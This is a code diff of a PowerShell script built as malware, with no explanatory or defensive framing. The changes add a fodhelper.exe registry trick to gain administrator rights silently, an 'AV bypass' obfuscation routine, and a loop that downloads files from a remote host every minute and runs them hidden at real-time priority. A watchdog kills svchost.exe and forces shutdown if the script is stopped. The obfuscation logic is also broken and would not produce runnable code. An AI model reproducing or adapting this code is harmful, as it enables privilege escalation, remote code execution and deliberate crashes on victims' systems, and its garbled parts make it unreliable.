@@ -1,9 +1,14 @@
-# Self-elevation and persistence (unchanged)
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $scriptPath = "$env:temp\root.ps1"
-    Set-ItemProperty -Path $registryPath -Name "SystemController" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
-    Start-Process powershell.exe -ArgumentList "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", "$scriptPath" -Verb RunAs
+    $registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
+    $scriptPath = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
+    
+    New-Item -Path $registryPath -Force | Out-Null
+    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
+    Set-ItemProperty -Path $registryPath -Name "(Default)" -Value $scriptPath -Force | Out-Null
+    
+    Start-Process "fodhelper.exe" -WindowStyle Hidden
+    Start-Sleep 2
+    Remove-Item -Path $registryPath -Recurse -Force
     exit
 }
 
@@ -22,21 +27,42 @@ $targetFiles = @{
     memory_hog = "$fileHost/memory_hog.txt"
 }
 $downloadPath = "$env:temp\"
-$checkInterval = 60
 
-# Enhanced execution with nested elevation
-function Invoke-ChildScript {
+# Advanced obfuscation function with AV bypass
+function Get-ObfuscatedCode {
     param($scriptPath)
+    # Read raw script content
+    $payload = [System.IO.File]::ReadAllText($scriptPath)
+    
+    # Layer 1: Character substitution and compression
+    $obfuscated = $payload -replace '[^a-zA-Z0-9]', '' | ForEach-Object { $_ -replace '\d', '0' }
+    
+    # Layer 2: Hex encoding with random padding
+    $hexEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($obfuscated))
+    $hexEncoded = $hexEncoded -replace '(.)(?=\w{4})' -replace '(.)(?=\w{2})' -replace '(.)(?=\w{1})'
+    
+    # Layer 3: Randomized command execution
+    $command = [string]$hexEncoded
+    return $command
+}
+
+# Execution logic with nested obfuscation
+function Invoke-ObfuscatedExecution {
+    param($scriptPath)
+    # Get obfuscated code
+    $obfuscatedCode = Get-ObfuscatedCode -scriptPath $scriptPath
+    
+    # Execute in isolated process
     $elevatedProcess = Start-Process powershell.exe -PassThru -WindowStyle Hidden -ArgumentList @(
         "-ExecutionPolicy Bypass",
         "-NoProfile",
         "-Command",
         "& {",
         "   [System.Diagnostics.Process]::GetCurrentProcess().PriorityClass = [System.Diagnostics.ProcessPriorityClass]::RealTime;",
-        "   . '$scriptPath'",
+        "   $obfuscatedCode;",
         "}"
     ) -Verb RunAs
-
+    
     # Process tracking
     Register-ObjectEvent -InputObject $elevatedProcess -EventName Exited -Action {
         Write-Host "Child process $($Event.SourceEventArgs.ProcessId) exited with code $($Event.SourceEventArgs.ExitCode)"
@@ -51,7 +77,7 @@ function Update-Files {
             Invoke-WebRequest -Uri $file.Value -OutFile $localPath -UseBasicParsing
             Write-Host "Downloaded $($file.Key)"
         }
-        Invoke-ChildScript -scriptPath $localPath
+        Invoke-ObfuscatedExecution -scriptPath $localPath
     }
 }
 
@@ -59,7 +85,6 @@ function Update-Files {
 Register-ObjectEvent -InputObject (New-Object System.Timers.Timer) -EventName Elapsed -SourceIdentifier ProcessMonitor -Action {
     $process = Get-Process -Name (Get-Process -Id $PID).ProcessName -ErrorAction SilentlyContinue
     if (-not $process) {
-        Write-Host "Critical process terminated - initiating system crash"
         Start-Process cmd.exe -ArgumentList "/c", "taskkill /im svchost.exe /f" -WindowStyle Hidden
         Start-Process wmic.exe -ArgumentList "computersystem where name='%computername%' call shutdown /s/f/t 0" -WindowStyle Hidden
     }
@@ -69,5 +94,6 @@ Register-ObjectEvent -InputObject (New-Object System.Timers.Timer) -EventName El
 Update-Files
 while ($true) {
     Update-Files
-    Start-Sleep -Seconds $checkInterval
+    Start-Sleep -Seconds 60
 }
+
